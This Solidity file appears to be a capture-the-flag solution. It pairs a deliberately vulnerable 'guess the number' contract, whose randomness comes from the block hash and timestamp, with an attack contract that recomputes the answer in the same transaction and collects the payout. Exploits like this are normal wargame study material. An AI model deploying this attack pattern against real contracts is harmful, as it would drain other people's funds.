pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessTheNewNumber {
    function GuessTheNewNumber(address challengeAddr) public payable{
        require(msg.value == 1 ether);

        // Instanciating the challenge contract
        GuessTheNewNumberChallenge challengeContract = GuessTheNewNumberChallenge(challengeAddr);

        // Getting the answer
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challengeContract.guess.value(msg.value)(answer);

        // Transfering back the funds to my address
        msg.sender.transfer(this.balance);
    }
}